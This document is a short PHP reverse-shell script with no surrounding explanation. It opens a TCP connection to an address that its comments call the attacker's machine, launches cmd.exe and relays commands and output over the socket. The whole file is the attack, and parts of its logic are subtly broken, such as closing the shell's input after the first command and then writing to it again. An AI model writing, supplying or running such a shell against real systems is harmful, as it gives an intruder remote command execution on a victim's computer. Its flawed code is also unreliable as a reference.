<?php
$ip = '127.0.0.1';  // IP address
$port = 443;     // listening port

// Create a socket and connect to the attacker's machine
if (($sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false) {
    die("Could not create socket: " . socket_strerror(socket_last_error()));
}

if (socket_connect($sock, $ip, $port) === false) {
    die("Could not connect: " . socket_strerror(socket_last_error($sock)));
}

// Command to execute (cmd.exe for Windows)
$cmd = "cmd.exe";

// Set up descriptors for process
$descriptorspec = [
    0 => ["pipe", "r"],  // stdin
    1 => ["pipe", "w"],  // stdout
    2 => ["pipe", "w"]   // stderr
];

// Open the process
$process = proc_open($cmd, $descriptorspec, $pipes);

if (is_resource($process)) {
    // Set non-blocking mode on the socket
    stream_set_blocking($sock, 0);

    while (true) {
        // Read data from the socket (commands from the attacker)
        $input = socket_read($sock, 1024);
        if ($input === false || $input === '') {
            // If no input, break the loop
            break;
        }

        // Write input to the shell's stdin
        fwrite($pipes[0], $input);

        // Close stdin to execute the command
        fclose($pipes[0]);

        // Read the shell's output
        while (($output = fread($pipes[1], 1024)) !== false) {
            // Send output back to the attacker
            socket_write($sock, $output);
        }

        // Check for errors
        $errors = fread($pipes[2], 1024);
        if ($errors) {
            socket_write($sock, $errors);
        }
    }

    // Close pipes and process
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($process);
}

// Close the socket
socket_close($sock);
?>
